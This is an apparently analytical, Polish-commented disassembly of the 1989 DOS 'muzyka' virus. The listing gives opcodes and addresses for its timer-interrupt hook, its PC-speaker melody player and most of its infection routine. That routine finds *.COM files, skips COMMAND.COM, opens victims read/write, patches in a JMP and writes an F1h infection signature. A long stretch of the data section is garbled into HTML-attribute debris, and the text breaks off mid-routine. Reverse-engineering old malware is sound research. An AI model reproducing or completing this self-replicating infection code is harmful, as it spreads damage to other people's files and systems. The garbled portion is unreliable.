

; Disasemblacja wirusa "muzyka"
;
; Dostarczony przez Z.Kasprzyckiego 20 czerwca 1989
;
; Dokleja od 2756 do 2805 bajt¢w do plik¢w typu COM
;
; ˜rednio co czwarta instalacja w systemie AT b‘dzie dodatkowo prowadzi
; dzia’alnož "rozrywkow†" czyli odgrywa jedn† z zaprogramowanych melodii.
;
; Kod disasemblowany po przesuni‘cia wirusa przed zara§ony program
; wirus zosta’ zatrzymany przed przyst†pieniem do r‘cznej wymiany wektor¢w 
; przerwa¤ w CS:0AA4h
;
; CS = 270D

; Tu nast‘puje pierwszy skok do kodu wirusa

0100 E9DD08        JMP     09E0

:--------------------------------------------------------------------------
; dane robocze wirusa
:--------------------------------------------------------------------------

org_4_bajty    db   0, 0, 0, 0    ; cztery oryginalne pocz†tkowe bajty programu

; jakaž flaga systematycznie powi‘kszana
; wartož 2 jest ustawiana ježli data systemowa jest wczežniejsza od 1.5.1989
;   znaczenia:
;     2 - s† podmienione wektory przerwa¤ prez wirusa
;     0 - nie graj, nie podmieniaj INT 8
;     wartož <= 1="" w="" czasie="" instalacji="" rezydentnej="" wirusa="" powoduje="" zaniechanie="" ;="" instalowania="" dzia’alnožci="" "rozrywkowej"="" l0107="" db="" 0bh="" ;="" adres="" kontynuacji="" pracy="" (wirusa="" lub="" oryginalnego="" programu)="" l0108="" db="" 00,="" 01,="" cah,="" 27h="" int_21h="" dd="" 0="" ;="" wartož="" oryginalnego="" wektora="" int="" 21h="" [010c]="" int_27h="" dd="" 0="" ;="" wartož="" oryginalnego="" wektora="" int="" 27h="" int_20h="" dd="" 0="" ;="" wartož="" oryginalnego="" wektora="" int="" 20h="" 0118="" 00="" 00="" 00="" 00="" ;="" int_08h="" dd="" 0="" ;="" wartož="" oryginalnego="" wektora="" int="" 8h="" stare_dta="" dd="" 0="" ;="" przechowalnia="" adresu="" starego="" dta="" (nosiciela)="" ;----------------------------------------------------------------="" ;="" nowe="" dta="" nowe_dta="" db="" 21="" dup="" (0)="" ;="" zarezerwowane="" dla="" dos="" atrybut="" db="" 0="" ;="" atrybut="" znalezionego="" pliku="" czas_pliku="" dw="" 0="" ;="" czas="" znalezionego="" pliku="" data_pliku="" dw="" 0="" ;="" data="" znalezionego="" pliku="" rozmiar_pliku="" dd="" 0="" ;="" rozmiar="" znalezionego="" pliku="" nazwa_pliku="" db="" 13="" dup="" (0)="" ;="" nazwa="" znalezionego="" pliku="" asciiz="" ;="" koniec="" dta="" ;----------------------------------------------------------------="" ;="" tu="" wirus="" wczytuje="" pocz†tkowe="" cztry="" bajty="" kandydata="" na="" ofiar‘="" bufor_kand="" db="" 0="" ;="" offset_kodu_wirusa="" dw="" 0="" ;="" w="" infekowanym="" pliku="" podpis="" db="" 0="" ;="" zaka§one="" pliki="" maj†="" tu="" f1h="" ;="" jakaž="" sta’a="" inicjalizowana="" na="" 14h,="" wspomaga="" muzykowanie="" (?)="" ;="" jest="" systematycznie="" zmniejszana,="" ježli="" przyjmie="" wartož="" 0="" to="" melodie="" nie="" b‘d†="" ;="" grane,="" po="" odegraniu="" ka§dej="" melodii="" jest="" inicjalizowana="" na="" 2="" l0153="" dw="" 14h="" ;="" wzorzec="" do="" poszukiwa¤="" (?)="" wzorzec="" db="" 2ah,="" 2eh,="" 43h,="" 4fh,="" 4dh,="" 00="" ;="" '*.com',="" 0="" 015b="" 5c="" ;="" '\'="" ;="" miejsce="" na="" asciiz="" nowego="" pliku="" ;="" 70="" bajt¢w="" 015c="" 2a="" 2e="" 43="" 4f="" *.co="" 0160="" 4d="" 00="" 4f="" 4d="" 00="" 2e="" 43="" 4f-4d="" 00="" 4f="" 4e="" 00="" 00="" 4c="" 00="" m.om..com.on..l.="" 0170="" 4f="" 4d="" 00="" 31="" 2e="" 53="" 4f="" 42-00="" 00="" 2e="" 43="" 4f="" 4d="" 00="" 20="" om.1.sob...com.="" 0180="" 20="" 2e="" 20="" 20="" 20="" 00="" 00="" 00-00="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" ............="" 01a0="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" 5c="" .......\="" ;="" w="" 01a8="" jest="" pozostawiany="" žlad="" czy="" pr¢ba="" infekcji="" by’a="" udana="" (??)="" ;="" 75="" bajt¢w="" 01a8="" 2a="" 2e="" 43="" 4f="" 4d="" 00="" 4f="" 4d="" *.com.om="" 01b0="" 00="" 43="" 4f="" 4d="" 00="" 4d="" 00="" 64-5c="" 2a="" 2e="" 43="" 4f="" 4d="" 00="" 43="" .com.m.d\*.com.c="" 01c0="" 48="" 50="" 45="" 4e="" 5c="" 2a="" 2e="" 43-4f="" 4d="" 00="" 00="" 00="" 00="" 00="" 00="" hpen\*.com......="" 01d0="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" 00-00="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" ................="" 01e0="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" 00-00="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" ................="" 01f0="" 00="" 00="" 00="" 5c="" ...\="" ;="" obszar="" budowy="" nazwy="" ofiary="" do="" zaka§enia="" ;="" 80="" bajt¢w="" 01f4="" 57="" 41="" 42="" 49-4b="" 43="" 4f="" 4d="" 2e="" 43="" 4f="" 4d="" wabikcom.com="" 0200="" 00="" 00="" 4d="" 00="" 5c="" 2a="" 2e="" 43-4f="" 4d="" 00="" 43="" 48="" 50="" 45="" 4e="" ..m.\*.com.chpen="" 0210="" 5c="" 2a="" 2e="" 43="" 4f="" 4d="" 00="" 00-00="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" \*.com..........="" 0220="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" 00-00="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" ................="" 0230="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" 00-00="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" ................="" 0240="" 00="" 00="" 00="" 00="" command_com="" db="" 'command.com',0="" ;="" nietykalny="" com="" (?!)="" ;="" flaga,="" 1="" -="" §e="" wektory="" przerwa¤="" s†="" ju§="" odtworzone="" ;="" nie="" zero="" -="" nie="" przeszkadzaj="" w="" instalowaniu="" rezydent¢w="" ;="" 0="" -="" wektory="" przerwa¤="" s†="" przej‘te="" l0250="" db="" 01="" kolejna_nuta="" dw="" 0255h="" ;="" adres="" kolejnej="" nuty="" (po="" trzy="" bajty)="" ;="" licznik="" czasu,="" ježli="" osi†gnie="" 0="" to="" rozpoczyna="" si‘="" odgrywanie="" melodii="" ;="" w="" czasie="" grania="" kom¢rka="" ta="" s’u§y="" jako="" flaga="" okrežlaj†ca="" stan="" g’¢žnika="" ;="" po="" zako¤czeniu="" melodii="" odtwarzana="" jest="" wartož="" pocz†tkowa="" minut_5="" dw="" 1518h="" ;="5" *="" 60="" *="" 18="" (odpowiednik="" 5="" minut?)="" ;-------------------------------------------------------------------------="" ;="" zapis="" melodii="" odgrywanych="" przez="" wirusa="" (po="" 3="" bajty="" na="" nut‘)="" 0255="" e4="" 07="" 06-e4="" 07="" 06="" da="" 08="" 03="" 64="" 09="" d..d..z..d.="" 0260="" 03="" 64="" 09="" 06="" f4="" 09="" 03="" 64-09="" 03="" 64="" 09="" 10="" 24="" 00="" 02="" .d..t..d..d..$..="" 0270="" f4="" 09="" 03="" 64="" 09="" 03="" 64="" 09-06="" f4="" 09="" 03="" 64="" 09="" 03="" e4="" t..d..d..t..d..d="" 0280="" 07="" 06="" 64="" 09="" 03="" e4="" 07="" 03-da="" 08="" 0c="" 8a="" 0a="" 06="" 24="" 00="" ..d..d..z.....$.="" 0290="" 03="" 8a="" 0a="" 03="" 8a="" 0a="" 06="" 2c-0b="" 03="" 8a="" 0a="" 03="" 8a="" 0a="" 06="" .......,........="" 02a0="" 2c="" 0b="" 03="" 8a="" 0a="" 03="" da="" 08-10="" 24="" 00="" 02="" 64="" 09="" 03="" 8a="" ,.....z..$..d...="" 02b0="" 0a="" 03="" 64="" 09="" 03="" e4="" 07="" 09-08="" 07="" 09="" 08="" 07="" 03="" 8a="" 0a="" ..d..d..........="" 02c0="" 10="" 24="" 00="" 02="" e4="" 07="" 06="" e4-07="" 06="" da="" 08="" 03="" 64="" 09="" 03="" .$..d..d..z..d..="" 02d0="" 64="" 09="" 06="" f4="" 09="" 03="" 64="" 09-03="" 64="" 09="" 10="" 24="" 00="" 02="" f4="" d..t..d..d..$..t="" 02e0="" 09="" 03="" 64="" 09="" 03="" 64="" 09="" 06-f4="" 09="" 03="" 64="" 09="" 03="" da="" 08="" ..d..d..t..d..z.="" 02f0="" 03="" 64="" 09="" 03="" 8a="" 0a="" 05="" 87-0c="" 01="" 8a="" 0a="" 0c="" d3="" 0b="" 06="" .d...........s..="" 0300="" 24="" 00="" 03="" d3="" 0b="" 03="" d3="" 0b-06="" 87="" 0c="" 03="" d3="" 0b="" 03="" f4="" $..s..s.....s..t="" 0310="" 09="" 06="" 8a="" 0a="" 03="" d3="" 0b="" 03-e9="" 05="" 0f="" 24="" 00="" 03="" d3="" 0b="" .....s..i..$..s.="" 0320="" 03="" 8a="" 0a="" 03="" 64="" 09="" 03="" e4-07="" 01="" 24="" 00="" 02="" d3="" 0b="" 03="" ....d..d..$..s..="" 0330="" 8a="" 0a="" 03="" 64="" 09="" 03="" e4="" 07-01="" 24="" 00="" 02="" cf="" 0f="" 03="" 16="" ...d..d..$..o...="" 0340="" 0e="" 05="" 64="" 09="" 01="" 8a="" 0a="" 0c-d3="" 0b="" 01="" 0a="" 00="" 0f="" cf="" 0f="" ..d.....s.....o.="" 0350="" 04="" 87="" 0c="" 04="" 8a="" 0a="" 04="" 8a-0a="" 04="" 24="" 00="" 04="" 45="" 05="" 02="" ..........$..e..="" 0360="" 24="" 00="" 02="" 45="" 05="" 02="" 24="" 00-06="" 43="" 06="" 02="" 24="" 00="" 02="" 43="" $..e..$..c..$..c="" 0370="" 06="" 02="" 24="" 00="" 06="" cf="" 0f="" 04-cf="" 0f="" 04="" 87="" 0c="" 04="" 8a="" 0a="" ..$..o..o.......="" 0380="" 04="" 8a="" 0a="" 04="" 24="" 00="" 04="" 45-05="" 02="" 24="" 00="" 02="" 45="" 05="" 02="" ....$..e..$..e..="" 0390="" 24="" 00="" 06="" e9="" 05="" 02="" 24="" 00-02="" e9="" 05="" 02="" 24="" 00="" 06="" b8="" $..i..$..i..$..8="" 03a0="" 10="" 04="" b8="" 10="" 04="" 16="" 0e="" 04-64="" 09="" 04="" 64="" 09="" 04="" 24="" 00="" ..8.....d..d..$.="" 03b0="" 04="" b2="" 04="" 02="" 24="" 00="" 02="" b2-04="" 02="" 24="" 00="" 06="" e9="" 05="" 02="" .2..$..2..$..i..="" 03c0="" 24="" 00="" 02="" e9="" 05="" 02="" 24="" 00-06="" b8="" 10="" 04="" b8="" 10="" 04="" 16="" $..i..$..8..8...="" 03d0="" 0e="" 04="" 64="" 09="" 04="" 64="" 09="" 04-24="" 00="" 04="" b2="" 04="" 02="" 24="" 00="" ..d..d..$..2..$.="" 03e0="" 02="" b2="" 04="" 02="" 24="" 00="" 06="" 43-06="" 02="" 24="" 00="" 02="" 43="" 06="" 02="" .2..$..c..$..c..="" 03f0="" 24="" 00="" 06="" cf="" 0f="" 04="" cf="" 0f-04="" 87="" 0c="" 04="" 8a="" 0a="" 04="" e4="" $..o..o........d="" 0400="" 07="" 04="" 24="" 00="" 04="" f2="" 03="" 02-24="" 00="" 02="" f2="" 03="" 02="" 24="" 00="" ..$..r..$..r..$.="" 0410="" 06="" 45="" 05="" 02="" 24="" 00="" 02="" 45-05="" 02="" 24="" 00="" 06="" cf="" 0f="" 04="" .e..$..e..$..o..="" 0420="" cf="" 0f="" 04="" 87="" 0c="" 04="" 8a="" 0a-04="" e4="" 07="" 04="" 24="" 00="" 04="" f2="" o........d..$..r="" 0430="" 03="" 02="" 24="" 00="" 02="" f2="" 03="" 02-24="" 00="" 06="" b2="" 04="" 02="" 24="" 00="" ..$..r..$..2..$.="" 0440="" 02="" b2="" 04="" 02="" 24="" 00="" 06="" 16-0e="" 04="" 16="" 0e="" 04="" d3="" 0b="" 04="" .2..$........s..="" 0450="" 64="" 09="" 02="" 24="" 00="" 02="" 64="" 09-0e="" 24="" 00="" 02="" 2c="" 0b="" 04="" 8a="" d..$..d..$..,...="" 0460="" 0a="" 04="" 43="" 06="" 10="" e4="" 07="" 04-87="" 0c="" 04="" 87="" 0c="" 08="" 16="" 0e="" ..c..d..........="" 0470="" 04="" 64="" 09="" 08="" 8a="" 0a="" 04="" cf-0f="" 04="" 24="" 00="" 02="" cf="" 0f="" 02="" .d.....o..$..o..="" 0480="" cf="" 0f="" 04="" 24="" 00="" 08="" 8a="" 0a-02="" 24="" 00="" 02="" d3="" 0b="" 02="" 24="" o..$.....$..s..$="" 0490="" 00="" 06="" 8a="" 0a="" 02="" 24="" 00="" 02-d3="" 0b="" 02="" 24="" 00="" 06="" 8a="" 0a="" .....$..s..$....="" 04a0="" 04="" 43="" 06="" 10="" 08="" 07="" 04="" 8a-0a="" 02="" 24="" 00="" 02="" 87="" 0c="" 02="" .c........$.....="" 04b0="" 24="" 00="" 06="" 8a="" 0a="" 02="" 24="" 00-02="" 87="" 0c="" 02="" 24="" 00="" 06="" 8a="" $.....$.....$...="" 04c0="" 0a="" 04="" 08="" 07="" 10="" e4="" 07="" 04-8a="" 0a="" 02="" 24="" 00="" 02="" d3="" 0b="" .....d.....$..s.="" 04d0="" 02="" 24="" 00="" 06="" 8a="" 0a="" 02="" 24-00="" 02="" d3="" 0b="" 02="" 24="" 00="" 06="" .$.....$..s..$..="" 04e0="" 8a="" 0a="" 04="" 43="" 06="" 10="" 08="" 07-04="" 8a="" 0a="" 04="" e4="" 07="" 04="" 08="" ...c........d...="" 04f0="" 07="" 04="" 43="" 06="" 04="" 45="" 05="" 08-e9="" 05="" 04="" 43="" 06="" 02="" 43="" 06="" ..c..e..i..c..c.="" 0500="" 02="" 43="" 06="" 04="" 08="" 07="" 02="" 24-00="" 02="" e4="" 07="" 04="" 24="" 00="" 08="" .c.....$..d..$..="" 0510="" 0a="" 00="" 0f="" 73="" 07="" 02="" e4="" 07-02="" e4="" 07="" 04="" 73="" 07="" 02="" e4="" ...s..d..d..s..d="" 0520="" 07="" 02="" e4="" 07="" 04="" 73="" 07="" 02-e4="" 07="" 02="" e4="" 07="" 04="" f8="" 04="" ..d..s..d..d..x.="" 0530="" 04="" 24="" 00="" 04="" f8="" 04="" 02="" 45-05="" 02="" e9="" 05="" 04="" e9="" 05="" 02="" .$..x..e..i..i..="" 0540="" a4="" 06="" 02="" 73="" 07="" 04="" 73="" 07-02="" e4="" 07="" 02="" da="" 08="" 04="" da="" $..s..s..d..z..z="" 0550="" 08="" 04="" 24="" 00="" 04="" e4="" 07="" 02-da="" 08="" 02="" da="" 08="" 04="" e4="" 07="" ..$..d..z..z..d.="" 0560="" 02="" da="" 08="" 02="" da="" 08="" 04="" e4-07="" 02="" da="" 08="" 02="" da="" 08="" 04="" .z..z..d..z..z..="" 0570="" 45="" 05="" 04="" 24="" 00="" 04="" 45="" 05-02="" e9="" 05="" 02="" 43="" 06="" 04="" 43="" e..$..e..i..c..c="" 0580="" 06="" 02="" 73="" 07="" 02="" e4="" 07="" 04-e4="" 07="" 02="" da="" 08="" 02="" f4="" 09="" ..s..d..d..z..t.="" 0590="" 04="" f4="" 09="" 04="" 24="" 00="" 04="" f8-04="" 02="" 45="" 05="" 02="" 45="" 05="" 04="" .t..$..x..e..e..="" 05a0="" 6e="" 04="" 04="" 43="" 06="" 04="" 45="" 05-04="" e9="" 05="" 04="" e4="" 07="" 04="" 24="" n..c..e..i..d..$="" 05b0="" 00="" 04="" f8="" 04="" 02="" 45="" 05="" 02-45="" 05="" 04="" 6e="" 04="" 04="" 43="" 06="" ..x..e..e..n..c.="" 05c0="" 04="" 45="" 05="" 04="" e9="" 05="" 04="" f8-04="" 04="" 45="" 05="" 02="" e9="" 05="" 02="" .e..i..x..e..i..="" 05d0="" a4="" 06="" 02="" 73="" 07="" 02="" e4="" 07-04="" 87="" 0c="" 04="" d3="" 0b="" 04="" 8a="" $..s..d.....s...="" 05e0="" 0a="" 04="" f4="" 09="" 04="" da="" 08="" 02-f4="" 09="" 02="" 8a="" 0a="" 04="" d3="" 0b="" ..t..z..t.....s.="" 05f0="" 04="" e4="" 07="" 04="" 24="" 00="" 04="" 2e-04="" 08="" f2="" 03="" 02="" 24="" 00="" 06="" .d..$.....r..$..="" 0600="" 2e="" 04="" 08="" f2="" 03="" 02="" 24="" 00-06="" 2e="" 04="" 08="" f2="" 03="" 04="" 2e="" ...r..$.....r...="" 0610="" 04="" 04="" f2="" 03="" 04="" 2e="" 04="" 04-f2="" 03="" 04="" 00="" 00="" 0f="" ..r.....r.....="" ;="" koniec="" partytury="" ;----------------------------------------------------------------------------="" ;------------------------------------------------------------------------="" ;="" procedura="" odpowiedzialna="" za="" odgrywanie="" melodyjki="" ;------------------------------------------------------------------------="" 061e="" ff0e5302="" dec="" word="" ptr="" [minut_5]="" 0622="" a15302="" mov="" ax,[minut_5]="" 0625="" 3d0100="" cmp="" ax,0001="" 0628="" 7406="" jz="" 0630="" ;="" wy’†cz="" gožnik="" 062a="" 3d0000="" cmp="" ax,0000="" 062d="" 740c="" jz="" 063b="" ;="" kontynuuj="" z="" kolejn†="" nut†="" 062f="" c3="" ret="" ;="" programowanie="" uk’adu="" ppi="" w="" celu="" wy’†czenia="" g’ožnika="" 0630="" e461="" in="" al,61="" ;="" odczyt="" stanu="" portu="" 0632="" 8ae0="" mov="" ah,al="" 0634="" 24fc="" and="" al,fc="" ;="" zgaž="" najni§sze="" dwa="" bity="" (wy’†cz)="" 0636="" eb00="" jmp="" 0638="" ;="" mini="" pauza="" 0638="" e661="" out="" 61,al="" ;="" sterowanie="" g’ožnika="" 063a="" c3="" ret="" ;="" odegranie="" melodyjki="" 063b="" 8b365102="" mov="" si,[kolejna_nuta]="" 063f="" 8306510203="" add="" word="" ptr="" [kolejna_nuta],+03="" 0644="" 8b1c="" mov="" bx,[si]="" ;="" pobranie="" kolejnej="" nuty="" 0646="" 8a4402="" mov="" al,[si+02]="" 0649="" 98="" cbw="" 064a="" 83fb0a="" cmp="" bx,+0a="" 064d="" 7702="" ja="" 0651="" 064f="" 86c4="" xchg="" ah,al="" 0651="" a35302="" mov="" [minut_5],ax="" ;="" prze’†cz="" flag‘="" stanu="" g’ožnika="" 0654="" 83fb00="" cmp="" bx,+00="" 0657="" 7508="" jnz="" 0661="" ;="" odegraj="" nut‘="" 0659="" c70651025502="" mov="" word="" ptr="" [kolejna_nuta],0255="" ;="" wskazuj="" pierwsz†="" nut‘="" 065f="" ebcf="" jmp="" 0630="" ;="" wy’†cz="" g’ožnik="" ;="" programowanie="" uk’adu="" zegarowego="" celem="" generowania="" muzyki="" 0661="" b0b6="" mov="" al,b6="" 0663="" e643="" out="" 43,al="" ;="" przygotowanie="" uk’adu="" 8253-5="" 0665="" 8bc3="" mov="" ax,bx="" ;="" cz‘stotliwož="" d¦wi‘ku="" 0667="" e642="" out="" 42,al="" ;="" wyžlij="" m’odszy="" bajt="" 0669="" eb00="" jmp="" 066b="" ;="" mini="" pauza="" 066b="" 8ac4="" mov="" al,ah="" 066d="" e642="" out="" 42,al="" ;="" wyžlij="" starszy="" bajt="" 066f="" e461="" in="" al,61="" ;="" odczyt="" stanu="" g’ožnika="" 0671="" 8ae0="" mov="" ah,al="" 0673="" 0c03="" or="" al,03="" ;="" w’†cz="" g’ožnik="" 0675="" eb00="" jmp="" 0677="" ;="" mini="" pauza="" 0677="" e661="" out="" 61,al="" 0679="" c3="" ret="" ;------------------------------------------------------------------------="" ;="" nowa="" obs’uga="" przerwania="" int="" 8h="" (przerwanie="" zegarowe)="" ;------------------------------------------------------------------------="" 067a="" 9c="" pushf="" 067b="" 50="" push="" ax="" 067c="" 53="" push="" bx="" 067d="" 51="" push="" cx="" 067e="" 52="" push="" dx="" 067f="" 56="" push="" si="" 0680="" 57="" push="" di="" 0681="" 55="" push="" bp="" 0682="" 1e="" push="" ds="" 0683="" 06="" push="" es="" 0684="" 9c="" pushf="" 0685="" 2e="" cs:="" 0686="" ff1e1c01="" call="" far="" [int_08h]="" 068a="" fb="" sti="" 068b="" 8cc8="" mov="" ax,cs="" 068d="" 8ed8="" mov="" ds,ax="" 068f="" 833e530100="" cmp="" word="" ptr="" [l0153],+00="" 0694="" 740f="" jz="" 06a5="" 0696="" ff0e5301="" dec="" word="" ptr="" [l0153]="" 069a="" 7509="" jnz="" 06a5="" 069c="" e87fff="" call="" 061e="" :="" muzykuj="" 069f="" c70653010200="" mov="" word="" ptr="" [l0153],0002="" 06a5="" 07="" pop="" es="" 06a6="" 1f="" pop="" ds="" 06a7="" 5d="" pop="" bp="" 06a8="" 5f="" pop="" di="" 06a9="" 5e="" pop="" si="" 06aa="" 5a="" pop="" dx="" 06ab="" 59="" pop="" cx="" 06ac="" 5b="" pop="" bx="" 06ad="" 58="" pop="" ax="" 06ae="" 9d="" popf="" 06af="" cf="" iret="" ;--------------------------------------------------------------------------="" ;="" inicjalizacja="" sta’ych="" roboczych="" wirusa="" odpowiedzialnych="" za="" muzykowanie="" ;--------------------------------------------------------------------------="" 06b0="" 8cc8="" mov="" ax,cs="" 06b2="" 8ed8="" mov="" ds,ax="" 06b4="" fe060701="" inc="" byte="" ptr="" [l0107]="" 06b8="" c606500200="" mov="" byte="" ptr="" [l0250],00="" 06bd="" c70653011400="" mov="" word="" ptr="" [l0153],0014="" ;="" inicjalizacja="" licznika="" 06c3="" c70651025502="" mov="" word="" ptr="" [kolejna_nuta],0255="" ;="" pocz†tek="" partytury="" 06c9="" c70653021815="" mov="" word="" ptr="" [minut_5],1518="" ;="" wartož="" pocz†tkowa="" czasu="" 06cf="" c3="" ret="" ;--------------------------------------------------------------------------="" ;="" kopiowanie="" asciz="" ’a¤cucha="" ;--------------------------------------------------------------------------="" 06d0="" ac="" lodsb="" 06d1="" aa="" stosb="" 06d2="" 3c00="" cmp="" al,00="" 06d4="" 75fa="" jnz="" 06d0="" 06d6="" c3="" ret="" ;--------------------------------------------------------------------------="" ;="" wyszukaj="" znak="" lub="" koniec="" asciiz="" ’a¤cucha="" ;--------------------------------------------------------------------------="" 06d7="" ac="" lodsb="" 06d8="" 3a05="" cmp="" al,[di]="" 06da="" 7507="" jnz="" 06e3="" ;="" al=""></=><> [DI]
06DC 3C00          CMP     AL,00
06DE 7403          JZ      06E3
06E0 47            INC     DI
06E1 EBF4          JMP     06D7
06E3 C3            RET

;--------------------------------------------------------------------------
; budowa nazwy kandydata na ofiar‘ (?)  na wejžciu DX = ?
;--------------------------------------------------------------------------

06E4 FC            CLD
06E5 8CC8          MOV     AX,CS
06E7 8EC0          MOV     ES,AX
06E9 8BF2          MOV     SI,DX
06EB 8A04          MOV     AL,[SI]
06ED 3C00          CMP     AL,00
06EF 7507          JNZ     06F8

06F1 B419          MOV     AH,19        ; Get current disk
06F3 E8E202        CALL    09D8         ; INT 21h  (A: := numer dysku)
06F6 FEC0          INC     AL           ; konwersja do symbolu ASCII
06F8 0440          ADD     AL,40        ; AL := A, B ...
06FA 2E            CS:
06FB A25C01        MOV     [015C],AL    ; konstrukcja nazwy dysku
06FE 2E            CS:
06FF C6065D013A    MOV     BYTE PTR [015D],3A      ; ':'
0704 2E            CS:
0705 C6065E0100    MOV     BYTE PTR [015E],00      ; ASCIIZ
070A EB0D          JMP     0719

070C FC            CLD
070D 8CC8          MOV     AX,CS
070F 8EC0          MOV     ES,AX
0711 8BF2          MOV     SI,DX
0713 BF5C01        MOV     DI,015C
0716 E8B7FF        CALL    06D0            ; kopiuj ASCII string

; odcinaj nazw‘ pliku i pozostaw jedynie nazw‘ katalogu (?)

0719 8CC8          MOV     AX,CS
071B 8ED8          MOV     DS,AX
071D BF5C01        MOV     DI,015C         ; offset žcie§ki do ofiary
0720 B000          MOV     AL,00           ; znacznik ko¤ca ASCIIZ stringu
0722 B94B00        MOV     CX,004B         ; 75 znak¢w
0725 F2            REPNZ                   ; szukaj
0726 AE            SCASB

0727 8A45FF        MOV     AL,[DI-01]      ; pe’na nazwa czy tylko dysk?
072A 3C3A          CMP     AL,3A           ; ':'
072C 7407          JZ      0735            ; tylko dysk

072E 3C5C          CMP     AL,5C           ; '\' katalog?
0730 7403          JZ      0735            ; tak

0732 4F            DEC     DI
0733 EBF2          JMP     0727             ; badaj poprzedni znak

0735 BE5501        MOV     SI,offset wzorzec
0738 E895FF        CALL    06D0                ; kopiuj ASCIIZ string
073B BE5C01        MOV     SI,015C
073E BFA801        MOV     DI,01A8
0741 E893FF        CALL    06D7                ; szukaj znaku '\'
0744 7501          JNZ     0747
0746 C3            RET

0747 BE5C01        MOV     SI,015C
074A BFA801        MOV     DI,01A8
074D E880FF        CALL    06D0                ; kopiuj ASCIIZ string
0750 BE5C01        MOV     SI,015C
0753 BFF401        MOV     DI,01F4
0756 E877FF        CALL    06D0
0759 06            PUSH    ES

075A B42F          MOV     AH,2F               ; Get DTA adres
075C E87902        CALL    09D8                ; INT 21h

075F 891E2001      MOV     [stare_DTA],BX
0763 8C062201      MOV     [stare_DTA + 2],ES
0767 07            POP     ES

0768 B41A          MOV     AH,1A             ; set disk transfer address (DTA)
076A BA2401        MOV     DX,nowe_DTA       ; DS:DX
076D E86802        CALL    09D8              ; INT 21h
0770 E81400        CALL    0787              ; zaka§aj
0773 1E            PUSH    DS
0774 B41A          MOV     AH,1A             ; set disk transfer address (DTA)
0776 C5162001      LDS     DX,[stare_DTA]    ; odtwarzaj DTA
077A E85B02        CALL    09D8              ; INT 21h
077D 1F            POP     DS
077E C3            RET

;--------------------------------------------------------------------------
; znajd¦ nast‘pnego kandydata na ofiar‘
;--------------------------------------------------------------------------

077F B44F          MOV     AH,4F            ; Find next
0781 E85402        CALL    09D8             ; INT 21h
0784 730E          JAE     0794
0786 C3            RET

;--------------------------------------------------------------------------
; wyszukaj ofiar‘
;--------------------------------------------------------------------------

0787 B44E          MOV     AH,4E        ; Find First
0789 BA5C01        MOV     DX,015C      ; DS:adres ASCIIZ nazwy (*.COM)
078C B92000        MOV     CX,0020      ; atrybut przeszukiwnia
078F E84602        CALL    09D8         ; INT 21h
0792 72F2          JB      0786         ; nie ma wi‘cej potencjalnych ofiar RET

0794 BE4201        MOV     SI,offset nazwa_pliku
0797 BF4402        MOV     DI,offset command_com
079A E83AFF        CALL    06D7         ; sprawd¦ czy to COMMAND.COM
079D 74E0          JZ      077F         ; FindNext

079F 833E400100    CMP     WORD PTR [0140],+00  ; kontrola d’ugožci pliku
07A4 75D9          JNZ     077F                 ; ponad 64 Kb, FindNext

; sygnatura dla OROPAX/1 staruje w 07A8

07A6 813E3E011DF2  CMP     WORD PTR [rozmiar_pliku],F21D ; 61891
07AC 77D1          JA      077F                          ; za d’ugi, FindNext

07AE BA0000        MOV     DX,0000
07B1 A13E01        MOV     AX,[rozmiar_pliku]    ; d’ugož kandydata na ofiar‘
07B4 BB3300        MOV     BX,0033
07B7 F7F3          DIV     BX
07B9 83FA00        CMP     DX,+00       ; file size mod 51 = 0 ?
07BC 74C1          JZ      077F         ; szukaj nast‘pnego, FindNext

07BE BFF401        MOV     DI,01F4      ; szukaj koniec nazwy
07C1 B000          MOV     AL,00
07C3 B94B00        MOV     CX,004B      ; wžr¢d 75 bajt¢w
07C6 F2            REPNZ
07C7 AE            SCASB
07C8 8A45FF        MOV     AL,[DI-01]   ; ostatni znak
07CB 3C3A          CMP     AL,3A        ; ':'
07CD 7407          JZ      07D6         ; znalaz’ež nazw‘ dysku

07CF 3C5C          CMP     AL,5C        ; '\'
07D1 7403          JZ      07D6         ; znalaz’ež nazw‘ katalogu

07D3 4F            DEC     DI
07D4 EBF2          JMP     07C8         ; badaj poprzedni znak

07D6 BE4201        MOV     SI,offset nazwa_pliku
07D9 E8F4FE        CALL    06D0         ; kopiuj nazw‘
07DC B8023D        MOV     AX,3D02      ; open file (read/write)
07DF BAF401        MOV     DX,01F4      ; ds:adres ASCIIZ nazwy
07E2 E8F301        CALL    09D8         ; INT 21h
07E5 729F          JB      0786         ; RET

07E7 8BD8          MOV     BX,AX        ; file handle
07E9 B43F          MOV     AH,3F        ; read from file
07EB BA4F01        MOV     DX,offset bufor_kand      ; ds:bufor DTA
07EE B90400        MOV     CX,0004      ; ile bajt¢w
07F1 E8E401        CALL    09D8         ; INT 21h
07F4 7303          JAE     07F9         ; kontroluj kod pierwszej instrukcji

07F6 E9C000        JMP     08B9         ; zamykaj plik ofiary

07F9 803E4F01FF    CMP     BYTE PTR [bufor_kand],FF  ; kod  JMP  FAR
07FE 740E          JZ      080E                      ; poniechaj ten plik

0800 803E4F01E9    CMP     BYTE PTR [bufor_kand],E9  ; kod  JMP  NEAR
0805 7510          JNZ     0817                      ; atakuj

0807 803E5201F1    CMP     BYTE PTR [podpis],F1
080C 7509          JNZ     0817                      ; atakuj

080E E8A800        CALL    08B9                      ; zamykaj plik ofiary
0811 A2A801        MOV     [01A8],AL
0814 E968FF        JMP     077F                      ; FindNext

0817 A14F01        MOV     AX,[bufor_kand]           ; pierwsze dwa bajty ofiary
081A A30301        MOV     [org_4_bajty],AX
081D A15101        MOV     AX,[bufor_kand + 2]       ; pozosta’e dwa bajty
0820 A30501        MOV     [org_4_bajty + 2],AX
0823 A13E01        MOV     AX,[rozmiar_pliku]        ; przechowaj rozmiar
0826 2D0300        SUB     AX,0003
0829 C6064F01E9    MOV     BYTE PTR [bufor_kand],E9  ; kod instrukcji  JMP NEAR
082E A35001        MOV     [offset_kodu_wirusa],AX
0831 C6065201F1    MOV     BYTE PTR [podpis],F1      ; podpisz si‘ 
